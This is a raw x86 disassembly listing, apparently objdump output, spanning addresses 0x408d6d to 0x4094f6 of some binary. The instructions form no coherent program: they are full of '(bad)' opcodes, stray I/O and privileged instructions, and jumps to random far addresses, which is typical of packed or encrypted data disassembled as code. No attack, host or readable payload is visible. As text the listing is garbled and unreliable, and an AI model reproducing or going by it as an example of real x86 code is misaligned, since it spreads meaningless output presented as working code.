  408d6d:	jae    0x408d2d
  408d6f:	add    bh,BYTE PTR [edi+0x7c]
  408d72:	shl    BYTE PTR [esi+0x2d],0xa4
  408d76:	rol    cl,cl
  408d78:	fidiv  DWORD PTR [ebx]
  408d7a:	std    
  408d7b:	or     DWORD PTR [eax+0x6e8a9c48],ebp
  408d81:	mov    ecx,0x8e5d7020
  408d86:	(bad)  
  408d87:	or     eax,0x451485c7
  408d8c:	dec    ebp
  408d8d:	fisub  DWORD PTR [ecx]
  408d8f:	and    ch,ch
  408d91:	iret   
  408d92:	push   esi
  408d93:	clc    
  408d94:	push   ds
  408d95:	ret    
  408d96:	rcr    BYTE PTR [esi-0x18],cl
  408d99:	jae    0x408da4
  408d9b:	sbb    ch,ch
  408d9d:	pushf  
  408d9e:	lds    edx,FWORD PTR [eax-0x14]
  408da1:	or     BYTE PTR [esi-0x65],bl
  408da4:	xchg   edx,eax
  408da5:	push   ss
  408da6:	(bad)  
  408daa:	sub    DWORD PTR [ecx+0x70cdf703],edi
  408db0:	dec    ecx
  408db1:	in     eax,0xba
  408db3:	sub    eax,0x9f6b7309
  408db8:	retf   0xbcf3
  408dbb:	push   esp
  408dbc:	mov    edx,0x3c7317f1
  408dc1:	add    DWORD PTR [ecx],ebx
  408dc3:	dec    esp
  408dc4:	jl     0x408daa
  408dc6:	jnp    0x408de9
  408dc8:	mov    ds:0xc3753731,al
  408dcd:	sti    
  408dce:	scas   al,BYTE PTR es:[edi]
  408dcf:	jl     0x408e07
  408dd1:	xor    dh,BYTE PTR [edi+0x50]
  408dd4:	xchg   esi,eax
  408dd5:	gs loop 0x408da2
  408dd8:	cdq    
  408dd9:	pop    ebx
  408dda:	outs   dx,DWORD PTR ds:[esi]
  408ddb:	arpl   WORD PTR ds:[edx+eiz*2+0x2a],bx
  408de0:	dec    ebx
  408de1:	or     DWORD PTR [eax],ebp
  408de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de4:	out    0x61,al
  408de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de7:	adc    ecx,DWORD PTR [edi]
  408de9:	div    DWORD PTR [ebx+0x56]
  408dec:	jns    0x408d86
  408dee:	ins    DWORD PTR es:[edi],dx
  408def:	push   ebx
  408df0:	ins    BYTE PTR es:[edi],dx
  408df1:	jmp    0x408e64
  408df3:	push   ebx
  408df4:	fxch   st(7)
  408df6:	dec    esp
  408df7:	and    ch,bl
  408df9:	dec    ebp
  408dfa:	daa    
  408dfb:	mov    ecx,0x984b676b
  408e00:	dec    ecx
  408e01:	loop   0x408e68
  408e03:	push   0xffffffc6
  408e05:	jbe    0x408dac
  408e07:	mov    ds:0x4a8c6f39,al
  408e0c:	(bad)  
  408e0d:	adc    eax,0x2f85b8b2
  408e12:	ret    
  408e13:	rol    DWORD PTR [ecx],0x42
  408e16:	xchg   esp,eax
  408e17:	or     BYTE PTR [edi-0x20],bl
  408e1a:	data16 mov WORD PTR cs:[ebp-0x281c1f7a],es
  408e22:	jl     0x408e9a
  408e24:	retf   0x60b5
  408e27:	or     eax,esi
  408e29:	sbb    BYTE PTR [edx],dl
  408e2b:	fcomip st,st(3)
  408e2d:	scas   al,BYTE PTR es:[edi]
  408e2e:	sbb    ebx,DWORD PTR [ebp+0x1c4c764a]
  408e34:	mov    esp,0xe7aba165
  408e39:	sbb    al,0x11
  408e3b:	inc    esi
  408e3c:	inc    eax
  408e3d:	dec    eax
  408e3e:	mov    ds:0xd76dcb0a,eax
  408e43:	sti    
  408e44:	cwde   
  408e45:	(bad)  
  408e46:	pop    edx
  408e47:	push   cs
  408e48:	ret    
  408e49:	test   eax,0xb49e46dd
  408e4e:	cwde   
  408e4f:	inc    ecx
  408e50:	dec    esi
  408e51:	or     DWORD PTR [ebp-0x110ecfb],eax
  408e57:	or     esi,DWORD PTR [edi]
  408e59:	loope  0x408def
  408e5b:	jmp    0xe6ff:0x2dc97998
  408e62:	test   BYTE PTR [eax+0x2ac92124],bl
  408e68:	mov    al,ds:0x3d53a1ed
  408e6d:	pushf  
  408e6e:	rcl    BYTE PTR [ebx],cl
  408e70:	add    BYTE PTR [edi],0x5c
  408e73:	shl    BYTE PTR [ebx],0x53
  408e76:	jns    0x408e1c
  408e78:	jp     0x408e5d
  408e7a:	out    dx,eax
  408e7b:	pop    esp
  408e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e7d:	daa    
  408e7e:	stos   BYTE PTR es:[edi],al
  408e7f:	jnp    0x408e2f
  408e81:	adc    cl,al
  408e83:	fadd   st(3),st
  408e85:	pop    esp
  408e86:	lods   eax,DWORD PTR ds:[esi]
  408e87:	sbb    bh,BYTE PTR [eax+eax*4-0x41]
  408e8b:	scas   al,BYTE PTR es:[edi]
  408e8c:	cmp    ecx,DWORD PTR [esi+ebp*8+0x5dda9a1]
  408e93:	dec    ecx
  408e94:	scas   al,BYTE PTR es:[edi]
  408e95:	aas    
  408e96:	sbb    ch,BYTE PTR [edx]
  408e98:	mov    ah,0xb1
  408e9a:	xor    ch,bl
  408e9c:	call   0x3f8c:0xff583026
  408ea3:	dec    ebp
  408ea4:	xchg   ecx,eax
  408ea5:	hlt    
  408ea6:	ds cwde 
  408ea8:	das    
  408ea9:	sbb    ebp,0x25
  408eac:	add    eax,0xd7f2df91
  408eb1:	adc    BYTE PTR [edx],al
  408eb3:	pop    eax
  408eb4:	push   ds
  408eb5:	shl    ebx,1
  408eb7:	mov    dl,0x10
  408eb9:	push   ecx
  408eba:	bsr    ebx,DWORD PTR [esi-0x48b93452]
  408ec1:	cmp    ch,BYTE PTR [esi-0x2ffb56a6]
  408ec7:	retf   0xd710
  408eca:	adc    DWORD PTR [ebp-0x5da9e7a0],esi
  408ed0:	add    edx,esi
  408ed2:	xchg   esp,eax
  408ed3:	push   eax
  408ed4:	dec    esi
  408ed5:	icebp  
  408ed6:	and    bh,BYTE PTR [edi]
  408ed8:	push   edx
  408ed9:	xchg   DWORD PTR [ebx-0x20],esi
  408edc:	sub    al,0x2c
  408ede:	test   BYTE PTR [edx],ah
  408ee0:	int3   
  408ee1:	idiv   al
  408ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee4:	mov    eax,0x85965660
  408ee9:	cld    
  408eea:	dec    ecx
  408eeb:	int    0x1d
  408eed:	and    DWORD PTR [edx+0x2e],0xffffffee
  408ef1:	fimul  WORD PTR [edx-0x4e919713]
  408ef7:	pop    esp
  408ef8:	test   DWORD PTR [ebp+0x12fc6b92],edi
  408efe:	ret    0x4bdb
  408f01:	mov    bl,0x1d
  408f03:	xchg   edi,eax
  408f04:	and    dh,BYTE PTR [edx-0x4a1d2d76]
  408f0a:	dec    ebx
  408f0b:	sub    DWORD PTR [edx],eax
  408f0d:	ret    
  408f0e:	push   ss
  408f0f:	ret    0x1a64
  408f12:	pop    ds
  408f13:	test   eax,0x54698a22
  408f18:	sbb    DWORD PTR [edx],ecx
  408f1a:	pop    ds
  408f1b:	dec    ebp
  408f1c:	test   al,0xba
  408f1e:	push   0xe4eda297
  408f23:	sbb    BYTE PTR [edx-0x7e],0xae
  408f27:	(bad)  
  408f29:	and    bl,dl
  408f2b:	mov    ds:0x7151b7ad,eax
  408f30:	scas   al,BYTE PTR es:[edi]
  408f31:	inc    ebx
  408f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f33:	(bad)  
  408f34:	(bad)  
  408f35:	lahf   
  408f36:	sbb    dl,ah
  408f38:	sub    eax,DWORD PTR [eax+0x1b469ecf]
  408f3e:	(bad)  
  408f3f:	fwait
  408f40:	or     ah,BYTE PTR [ecx+0x68]
  408f43:	popa   
  408f44:	(bad)  
  408f45:	sbb    DWORD PTR [ebp+ebp*8-0x80],esi
  408f49:	test   ah,0x3a
  408f4c:	xor    ah,BYTE PTR [edx+0x373f7005]
  408f52:	add    al,0x60
  408f54:	fadd   QWORD PTR [edx+0x64]
  408f57:	mov    bl,0x8f
  408f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f5a:	jp     0x408fbb
  408f5c:	(bad)  
  408f5d:	mov    ch,0x24
  408f5f:	(bad)  
  408f60:	jae    0x408f14
  408f62:	xor    dh,bh
  408f64:	jle    0x408fd3
  408f66:	je     0x408fc6
  408f68:	adc    cl,ch
  408f6a:	and    DWORD PTR ds:0x798379e8,esp
  408f70:	jns    0x408f4c
  408f72:	sbb    ebx,edi
  408f74:	sbb    BYTE PTR [ebx-0x5f],dh
  408f77:	mov    ?,WORD PTR [edi-0x15]
  408f7a:	add    BYTE PTR [edx-0x711bb2ca],al
  408f80:	int    0x89
  408f82:	ins    BYTE PTR es:[edi],dx
  408f83:	fxch   st(2)
  408f85:	pop    ss
  408f86:	jp     0x408fd2
  408f88:	popf   
  408f89:	sbb    esi,DWORD PTR [edx+0x41]
  408f8c:	push   es
  408f8d:	mov    ecx,edx
  408f8f:	cdq    
  408f90:	fmulp  st(3),st
  408f92:	and    al,0x53
  408f94:	or     eax,0x526da2b0
  408f99:	sub    dl,BYTE PTR [ebp+ecx*4-0x657963e2]
  408fa0:	fstp   QWORD PTR [ebp+0x2b]
  408fa3:	stc    
  408fa4:	push   0xd0bc8ae3
  408fa9:	enter  0x117b,0x3f
  408fad:	sbb    eax,0xc58e3a82
  408fb2:	ficomp WORD PTR [ecx-0x74434a2c]
  408fb8:	inc    ebp
  408fb9:	(bad)  
  408fba:	in     al,dx
  408fbb:	pop    ss
  408fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fbd:	add    bl,ch
  408fbf:	push   ss
  408fc0:	push   ebx
  408fc1:	cli    
  408fc2:	bound  ebp,QWORD PTR [edi+eiz*4]
  408fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fc6:	adc    ebx,DWORD PTR [edx+0x28]
  408fc9:	mov    ch,0xf9
  408fcb:	rol    DWORD PTR [eax],cl
  408fcd:	adc    DWORD PTR [edi-0x6],esp
  408fd0:	add    dh,BYTE PTR [esi-0x55]
  408fd3:	dec    ebx
  408fd4:	scas   al,BYTE PTR es:[edi]
  408fd5:	jo     0x408fc8
  408fd7:	fcomi  st,st(0)
  408fd9:	hlt    
  408fda:	sbb    eax,0x44b1d233
  408fdf:	and    esi,DWORD PTR [ecx+0x70]
  408fe2:	ins    DWORD PTR es:[edi],dx
  408fe3:	ins    BYTE PTR es:[edi],dx
  408fe4:	stc    
  408fe5:	push   0xffffff84
  408fe7:	stos   DWORD PTR es:[edi],eax
  408fe8:	sbb    DWORD PTR [edx+0x4d73e0fb],0x75e29b46
  408ff2:	push   ebx
  408ff3:	xchg   ebx,eax
  408ff4:	xor    BYTE PTR [ebp+0x45],bl
  408ff7:	fwait
  408ff8:	mov    al,ds:0x69062b7
  408ffd:	imul   ebp,DWORD PTR [eax-0x5c10183e],0xffffffed
  409004:	push   ds
  409005:	jbe    0x409071
  409007:	sbb    eax,0x984d11dd
  40900c:	rol    BYTE PTR [ebx+0x6a],0x4f
  409010:	icebp  
  409011:	xor    ecx,ecx
  409013:	xor    eax,0xae54c2fb
  409018:	mov    fs,WORD PTR [eax+0x3fc7ddff]
  40901e:	adc    DWORD PTR [edi+eax*1+0x19],0xffffffd6
  409023:	jg     0x408fe3
  409025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409026:	loope  0x408fbd
  409028:	shr    DWORD PTR [esi],1
  40902a:	das    
  40902b:	mov    WORD PTR ds:0xb34a6164,ss
  409031:	push   cs
  409032:	or     BYTE PTR [ecx-0x64],bh
  409035:	lds    edi,FWORD PTR [ebx+0x2a]
  409038:	xor    edi,edx
  40903a:	add    al,0xd0
  40903c:	jnp    0x409032
  40903e:	or     eax,0x913bb838
  409043:	jno    0x4090c1
  409045:	pop    DWORD PTR [ebx]
  409047:	jp     0x409018
  409049:	cmp    BYTE PTR [edx],bh
  40904b:	inc    edx
  40904c:	push   ss
  40904d:	cmp    al,0x54
  40904f:	push   ebp
  409050:	add    DWORD PTR ds:0x2d7d91e4,eax
  409056:	sbb    al,0x1d
  409058:	ficom  WORD PTR [edi+ebx*8-0x16]
  40905c:	je     0x409002
  40905e:	inc    edx
  40905f:	xor    BYTE PTR [esi+edi*4-0x45],dl
  409063:	sbb    al,0x7d
  409065:	dec    edi
  409066:	nop
  409067:	in     al,dx
  409068:	loopne 0x408fec
  40906a:	stos   BYTE PTR es:[edi],al
  40906b:	mov    BYTE PTR [eax+edi*2-0x61],ah
  40906f:	cld    
  409070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409071:	xlat   BYTE PTR ds:[ebx]
  409072:	scas   eax,DWORD PTR es:[edi]
  409073:	or     eax,DWORD PTR [edx-0x46]
  409076:	jbe    0x409070
  409078:	jnp    0x409069
  40907a:	xchg   edx,eax
  40907b:	mov    ebp,0xa24e323e
  409080:	mov    ch,0xff
  409082:	sub    edx,DWORD PTR ds:0x800b955c
  409088:	xchg   BYTE PTR [ecx-0x6f],dh
  40908b:	fnsave [edx+0x115e97e9]
  409091:	jnp    0x409026
  409093:	dec    esp
  409094:	jo     0x4090aa
  409096:	arpl   WORD PTR [eax-0x51],si
  409099:	inc    esp
  40909a:	and    eax,0xe128bcdb
  40909f:	push   ebx
  4090a0:	(bad)  
  4090a2:	adc    ah,0xfb
  4090a5:	int3   
  4090a6:	pusha  
  4090a7:	sub    dh,ah
  4090a9:	mov    esp,0x8ca6b653
  4090ae:	aas    
  4090af:	popf   
  4090b0:	xchg   esi,edi
  4090b2:	adc    eax,0x6ebf64a6
  4090b7:	jg     0x409135
  4090b9:	fiadd  DWORD PTR [ecx+0xb]
  4090bc:	in     al,0x6c
  4090be:	js     0x40910e
  4090c0:	or     dl,BYTE PTR [eax-0x326f70d3]
  4090c6:	cdq    
  4090c7:	and    bh,BYTE PTR [edx+0x5e312ebd]
  4090cd:	jmp    0xd864ecbc
  4090d2:	push   0x71f3d070
  4090d7:	xchg   edi,eax
  4090d8:	pop    esi
  4090d9:	jg     0x409145
  4090db:	cmp    DWORD PTR [esi+eax*2],0x59
  4090df:	adc    DWORD PTR [edi+0x1403769],esp
  4090e5:	pop    es
  4090e6:	ins    BYTE PTR es:[edi],dx
  4090e7:	fst    DWORD PTR ds:0x734656c
  4090ed:	xor    edi,DWORD PTR [ecx]
  4090ef:	mov    bl,0xcb
  4090f1:	pop    edi
  4090f2:	int3   
  4090f3:	adc    ecx,0xffffffaf
  4090f6:	mov    edi,0xb90f48a9
  4090fb:	cmp    eax,0xa657dd62
  409100:	cli    
  409101:	and    al,0x7e
  409103:	dec    ebp
  409104:	ret    
  409105:	cwde   
  409106:	rcl    BYTE PTR [esi],0x89
  409109:	add    cl,BYTE PTR gs:[ebx+0x3d]
  40910d:	out    dx,eax
  40910e:	cdq    
  40910f:	pop    ss
  409110:	ret    
  409111:	mov    edx,0xb509fc25
  409116:	sbb    dl,BYTE PTR [esi]
  409118:	and    eax,0xcf451cf3
  40911d:	mov    ah,0xce
  40911f:	(bad)  
  409120:	call   0x83f47abe
  409125:	and    al,0xcc
  409127:	fcomi  st,st(6)
  409129:	mov    ecx,0xc0f2d5cc
  40912e:	cmp    eax,0x89e70bb9
  409133:	pop    esp
  409134:	addr16 or al,0x3d
  409137:	loopne 0x4091b0
  409139:	push   ebx
  40913a:	lea    esi,[esi+edx*4]
  40913d:	dec    ecx
  40913e:	fucomi st,st(4)
  409140:	pop    edi
  409141:	or     BYTE PTR [edi],al
  409143:	fwait
  409144:	stos   BYTE PTR es:[edi],al
  409145:	ret    0x2c6e
  409148:	mov    ah,0x9
  40914a:	add    al,0x87
  40914c:	test   BYTE PTR [esi],ch
  40914e:	and    BYTE PTR [ecx-0x57],bl
  409151:	div    edx
  409153:	add    BYTE PTR [edx-0x18a00c0f],dl
  409159:	and    dl,BYTE PTR [esi+0x224a24e]
  40915f:	pop    esi
  409160:	xchg   ebx,eax
  409161:	ss loop 0x40915b
  409164:	and    ecx,edx
  409166:	xchg   ebp,eax
  409167:	xor    al,BYTE PTR [ecx-0x16c79189]
  40916d:	sbb    DWORD PTR [esi],0xd6c8161e
  409173:	cld    
  409174:	inc    DWORD PTR [edx+0x3c]
  409177:	pop    ss
  409178:	(bad)  
  409179:	fmul   QWORD PTR [edx]
  40917b:	mov    al,BYTE PTR [eax+0x3e]
  40917e:	xor    ch,BYTE PTR [esi]
  409180:	sbb    ch,BYTE PTR [esi+ebp*4+0x79]
  409184:	cwde   
  409185:	mov    dl,0xfb
  409187:	adc    ebp,DWORD PTR [eax-0x1e]
  40918a:	push   ecx
  40918b:	adc    DWORD PTR [ecx-0xce56f91],ecx
  409191:	mov    DWORD PTR [esi],ebp
  409193:	ret    0xe0d7
  409196:	rcr    BYTE PTR [ebx+0x42],1
  409199:	ror    DWORD PTR [ecx+0xe],1
  40919c:	mov    ch,0xcf
  40919e:	jecxz  0x40916b
  4091a0:	leave  
  4091a1:	cld    
  4091a2:	aaa    
  4091a3:	add    ebx,DWORD PTR [eax+0x24]
  4091a6:	dec    ecx
  4091a7:	add    eax,DWORD PTR [edx+0x100d2d]
  4091ad:	popf   
  4091ae:	hlt    
  4091af:	repz adc al,0x7c
  4091b2:	cwde   
  4091b3:	jnp    0x409192
  4091b5:	inc    ecx
  4091b6:	ja     0x409171
  4091b8:	test   dh,ah
  4091ba:	shl    DWORD PTR [ecx+0x610b6dd],0xde
  4091c1:	push   ebx
  4091c2:	adc    BYTE PTR [ecx-0x53],bh
  4091c5:	inc    ebp
  4091c6:	dec    eax
  4091c7:	push   esi
  4091c8:	pop    ss
  4091c9:	mov    bh,0x3d
  4091cb:	arpl   di,bp
  4091cd:	mov    esp,0xd5067ab2
  4091d2:	adc    DWORD PTR [edi+0x6f],esi
  4091d5:	inc    edi
  4091d6:	dec    eax
  4091d7:	cmp    bh,BYTE PTR [edi+0x2a]
  4091da:	push   esi
  4091db:	pop    ecx
  4091dc:	mov    WORD PTR [ecx+0x2a2bd570],ds
  4091e2:	adc    BYTE PTR [ecx-0x72],ah
  4091e5:	(bad)  
  4091e6:	(bad)  
  4091e7:	sub    bh,0x1e
  4091ea:	mov    dh,ah
  4091ec:	dec    esi
  4091ed:	jns    0x4091a2
  4091ef:	es (bad) 
  4091f1:	sahf   
  4091f2:	or     al,0xa7
  4091f4:	ds jno 0x4091fb
  4091f7:	out    0x53,al
  4091f9:	push   eax
  4091fa:	lods   al,BYTE PTR ds:[esi]
  4091fb:	fstp   DWORD PTR [eax+0x2a]
  4091fe:	add    al,0x1
  409200:	inc    edi
  409201:	jo     0x4091cf
  409203:	cli    
  409204:	ds push ecx
  409206:	inc    esi
  409207:	in     eax,dx
  409208:	pop    edx
  409209:	out    dx,eax
  40920a:	dec    esp
  40920b:	(bad)  
  40920c:	stc    
  40920d:	add    al,0x56
  40920f:	stos   BYTE PTR es:[edi],al
  409210:	ds es pusha 
  409213:	push   eax
  409214:	in     al,dx
  409215:	das    
  409216:	xor    eax,0x3191617c
  40921b:	bound  eax,QWORD PTR [ebp-0x5cc5a160]
  409221:	loop   0x40925c
  409223:	cmp    eax,0xa0fc7e98
  409228:	mov    dh,dh
  40922a:	and    BYTE PTR [ecx-0x550d78e6],ch
  409230:	lods   al,BYTE PTR ds:[esi]
  409231:	jnp    0x4091e9
  409233:	(bad)  
  409234:	sbb    DWORD PTR [ecx],edx
  409236:	cli    
  409237:	pop    ebx
  409238:	add    eax,0x782822f9
  40923d:	cmp    ecx,DWORD PTR [edi+eax*1-0x74]
  409241:	out    dx,al
  409242:	push   eax
  409243:	cli    
  409244:	sub    DWORD PTR [edi],eax
  409246:	arpl   cx,bx
  409248:	imul   esp,DWORD PTR [esi-0x2259f690],0x4c
  40924f:	arpl   WORD PTR [edi+0x73],bp
  409252:	jae    0x409210
  409254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409255:	xchg   esp,eax
  409256:	xchg   edi,eax
  409257:	in     al,0x7a
  409259:	mov    dl,0x88
  40925b:	jb     0x409279
  40925d:	dec    esp
  40925e:	adc    ecx,DWORD PTR [ebx+0x51]
  409261:	dec    esi
  409262:	int3   
  409263:	xor    ah,BYTE PTR [ebx-0x52]
  409266:	lods   eax,DWORD PTR ds:[esi]
  409267:	lea    edi,[ecx-0x6e5c3fe1]
  40926d:	fs call 0x72f8:0x4a48b627
  409275:	push   0x19
  409277:	scas   eax,DWORD PTR es:[edi]
  409278:	dec    ebx
  409279:	lods   al,BYTE PTR ds:[esi]
  40927a:	pop    ecx
  40927b:	lock (bad) 
  40927d:	push   cs
  40927e:	xchg   ebp,eax
  40927f:	cmp    DWORD PTR [ecx+0x6045da7d],ebx
  409285:	mov    ecx,0x4360f38d
  40928a:	fdiv   DWORD PTR [edx+0x255fc3e5]
  409290:	cmp    ecx,DWORD PTR [edi+0x14ebe5c1]
  409296:	ja     0x4092f3
  409298:	dec    eax
  409299:	mov    esp,0x97e435fe
  40929e:	cmp    al,0x9d
  4092a0:	push   ss
  4092a1:	popa   
  4092a2:	std    
  4092a3:	push   ecx
  4092a4:	test   eax,0xbbe86357
  4092a9:	inc    edx
  4092aa:	mov    ss,eax
  4092ac:	int    0xdb
  4092ae:	icebp  
  4092af:	mov    WORD PTR [edi-0x24],ds
  4092b2:	retf   
  4092b3:	ror    BYTE PTR [ebx],1
  4092b5:	inc    ebx
  4092b6:	add    al,0x69
  4092b8:	sub    edi,DWORD PTR [ecx+0x50aea0e]
  4092be:	cmp    eax,0xc3bc9d6f
  4092c3:	mov    bh,0xa9
  4092c5:	lods   al,BYTE PTR ds:[esi]
  4092c6:	scas   al,BYTE PTR es:[edi]
  4092c7:	jp     0x40926e
  4092c9:	repz jbe 0x40931d
  4092cc:	and    bh,BYTE PTR [esi]
  4092ce:	jl     0x4092c8
  4092d0:	mov    al,ds:0xff6b8364
  4092d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092d6:	bound  edx,QWORD PTR [edi+0x7d]
  4092d9:	pop    esi
  4092da:	mov    bl,0xf2
  4092dd:	push   esi
  4092de:	jno    0x409340
  4092e0:	in     eax,0x50
  4092e2:	lods   al,BYTE PTR ds:[esi]
  4092e3:	stos   BYTE PTR es:[edi],al
  4092e4:	mov    al,ds:0xcf184928
  4092e9:	stos   BYTE PTR es:[edi],al
  4092ea:	js     0x409306
  4092ec:	or     eax,edx
  4092ee:	mov    ds:0x75b20c68,al
  4092f3:	test   BYTE PTR [edi-0x29a4274],dl
  4092f9:	mov    al,ds:0x7ad25fc9
  4092fe:	arpl   WORD PTR [eax],sp
  409300:	outs   dx,BYTE PTR ds:[esi]
  409301:	or     bl,dl
  409303:	adc    eax,0x498c8d0c
  409308:	dec    eax
  409309:	jl     0x409314
  40930b:	and    eax,esp
  40930d:	sub    BYTE PTR [ecx-0x6d],0xe4
  409311:	jmp    0x409296
  409313:	test   BYTE PTR [edi-0x4f7cd113],dl
  409319:	and    BYTE PTR [di+0x2430],cl
  40931e:	and    DWORD PTR [edx-0x3d],esi
  409321:	mov    eax,ds:0xf39c7ccf
  409326:	clc    
  409327:	jo     0x409315
  409329:	xchg   ebp,eax
  40932a:	repz sub al,0xc2
  40932d:	push   ebx
  40932e:	xchg   edi,eax
  40932f:	mov    bh,0x30
  409331:	jecxz  0x409320
  409333:	repz jmp 0x7641:0xcbff58f0
  40933b:	xor    ch,al
  40933d:	inc    eax
  40933e:	into   
  40933f:	cwde   
  409340:	mov    eax,0xcf3f28f
  409345:	mov    esi,0xde1b217c
  40934a:	rcr    bh,1
  40934c:	fsub   DWORD PTR [edi+0x685fdd]
  409352:	sub    BYTE PTR [edi],ch
  409354:	jmp    0x85f954c3
  409359:	and    DWORD PTR [eax-0x10],ebx
  40935c:	xchg   edi,eax
  40935d:	push   esp
  40935e:	mov    ebx,DWORD PTR [ecx]
  409360:	sub    al,0x87
  409362:	aaa    
  409363:	sub    al,0x2
  409365:	cli    
  409366:	imul   eax,edi,0xffffff89
  409369:	jb     0x40932a
  40936b:	imul   esp,DWORD PTR [ecx-0x44051072],0xffffffb2
  409372:	xchg   edx,ecx
  409374:	iret   
  409375:	xor    DWORD PTR [ebx-0x63],ebp
  409378:	jb     0x4093ed
  40937a:	mov    ah,0xc
  40937c:	ror    DWORD PTR [ecx-0x66],1
  40937f:	xchg   esi,eax
  409380:	gs jecxz 0x4093dd
  409383:	loopne 0x4093ce
  409385:	sbb    DWORD PTR [ecx+ebx*8],ecx
  409388:	adc    al,0xcd
  40938b:	sbb    bl,bh
  40938d:	push   ebp
  40938e:	push   cs
  40938f:	sbb    al,0x74
  409391:	test   al,0x46
  409393:	(bad)  
  409394:	mov    eax,0x97b846ee
  409399:	repnz pop ebp
  40939b:	or     eax,0xb2fd5a48
  4093a0:	mov    dh,0x56
  4093a2:	sbb    DWORD PTR [ebx+0x8],ebp
  4093a5:	dec    eax
  4093a6:	push   edx
  4093a7:	(bad)  
  4093a8:	sar    BYTE PTR [eax],cl
  4093aa:	and    al,0xc1
  4093ac:	and    BYTE PTR [edx],al
  4093ae:	inc    ebp
  4093af:	and    DWORD PTR [edi+0x43a957f5],ecx
  4093b5:	xor    al,0xce
  4093b7:	arpl   WORD PTR [eax+edx*1],dx
  4093ba:	call   0x4499b089
  4093bf:	fcom   QWORD PTR [ebp+0x3b]
  4093c2:	pop    esi
  4093c3:	pop    esp
  4093c4:	imul   ecx,DWORD PTR [esi+0x29],0xffffff86
  4093c8:	mov    ebp,0x86240133
  4093cd:	fxch   st(4)
  4093cf:	nop
  4093d0:	mov    ebx,0x15338b80
  4093d5:	pushf  
  4093d6:	inc    esi
  4093d7:	(bad)  
  4093d8:	or     bl,BYTE PTR [ecx+0x7b]
  4093db:	mov    ebp,DWORD PTR [edi-0x7cdd96e8]
  4093e1:	sub    bh,BYTE PTR [ebx+0x19de6725]
  4093e7:	call   0xd0afcb01
  4093ec:	lods   al,BYTE PTR ds:[esi]
  4093ed:	xor    eax,edx
  4093ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093f0:	das    
  4093f1:	pop    edx
  4093f2:	sub    al,0xd0
  4093f4:	ins    DWORD PTR es:[edi],dx
  4093f5:	call   0x5e7a:0x8113dad2
  4093fc:	out    0x8c,al
  4093fe:	xchg   edx,eax
  4093ff:	loopne 0x4093ef
  409401:	cli    
  409402:	cmp    bh,BYTE PTR [edi]
  409404:	lea    ebx,[ecx+0x4bcefef9]
  40940a:	add    bh,BYTE PTR ds:0x54fbd6bc
  409410:	mov    eax,ds:0xe53c7f89
  409415:	sahf   
  409416:	cs xchg ebp,eax
  409418:	lahf   
  409419:	mov    ecx,0x6d1f1509
  40941e:	inc    eax
  40941f:	jo     0x4093a6
  409421:	mov    ds:0xfdee4dc6,al
  409426:	sbb    esi,DWORD PTR ds:0x1ec1c4fc
  40942c:	or     eax,0x347e411c
  409431:	or     eax,0xba7e59c
  409436:	dec    ebx
  409437:	int    0x9b
  409439:	cmp    al,0x32
  40943b:	dec    eax
  40943c:	jnp    0x40949b
  40943e:	stos   BYTE PTR es:[edi],al
  40943f:	jp     0x4093c6
  409441:	mov    ch,0x35
  409443:	push   ebp
  409444:	aaa    
  409445:	out    0xb5,eax
  409447:	popa   
  409448:	cmp    esi,ebx
  40944a:	rol    BYTE PTR [ebp+0x2c],1
  40944d:	out    dx,eax
  40944e:	jns    0x40946a
  409450:	cmp    eax,0xf1466ad9
  409455:	xchg   BYTE PTR [edx+0x24],al
  409458:	ds mov edi,0x5f842707
  40945e:	retf   
  40945f:	dec    esi
  409460:	outs   dx,BYTE PTR ds:[esi]
  409461:	mov    ah,0x9f
  409463:	mov    ecx,0xd7682e48
  409468:	sub    ah,BYTE PTR [edi]
  40946a:	xor    BYTE PTR [edi+0x21],0xbc
  40946e:	inc    ecx
  40946f:	push   0x458c68c7
  409474:	clc    
  409475:	jnp    0x4094b3
  409477:	push   ebx
  409478:	loopne 0x409428
  40947a:	shl    esi,0xc1
  40947d:	add    DWORD PTR [ebx],edx
  40947f:	mov    ebx,0xec1341ef
  409484:	and    ah,ah
  409486:	add    DWORD PTR [bx+si+0x6f02],edx
  40948b:	ja     0x409428
  40948d:	pop    es
  40948e:	inc    esi
  40948f:	ins    DWORD PTR es:[edi],dx
  409490:	inc    ebp
  409491:	and    edx,DWORD PTR [edi+0x13baee91]
  409497:	aam    0x3d
  409499:	add    BYTE PTR [ebx+eax*1+0x4f],ah
  40949d:	add    eax,0x29f021aa
  4094a2:	mov    WORD PTR [ecx-0xe],fs
  4094a5:	stos   BYTE PTR es:[edi],al
  4094a6:	call   0x2598b8b5
  4094ab:	addr16 jle 0x40945b
  4094ae:	fld    QWORD PTR [edi-0x80]
  4094b1:	cmp    DWORD PTR [edx],0x75d81c39
  4094b7:	aas    
  4094b8:	test   al,0x26
  4094ba:	dec    esp
  4094bb:	mov    ebp,eax
  4094bd:	jns    0x40944a
  4094bf:	cld    
  4094c0:	ins    BYTE PTR es:[edi],dx
  4094c1:	call   0xfcc32cca
  4094c6:	push   esp
  4094c7:	adc    eax,0x38769135
  4094cc:	and    dh,BYTE PTR [eax-0x50ce19ff]
  4094d2:	jns    0x409536
  4094d4:	inc    ebp
  4094d5:	mov    eax,ds:0xcb3debc0
  4094da:	mov    dl,0xf0
  4094dc:	stc    
  4094dd:	in     al,dx
  4094de:	clc    
  4094df:	sbb    al,0x96
  4094e1:	repz jnp 0x4094dc
  4094e4:	cmp    DWORD PTR [esi],ebp
  4094e6:	xchg   edx,eax
  4094e7:	mov    db5,ebp
  4094ea:	mov    BYTE PTR [esp+ebp*1-0x3078f604],al
  4094f1:	iret   
  4094f2:	sti    
  4094f3:	sti    
  4094f4:	in     al,0x6a
  4094f6:	fimul  DWORD PTR [ebx*8+0x61e5c5e8]
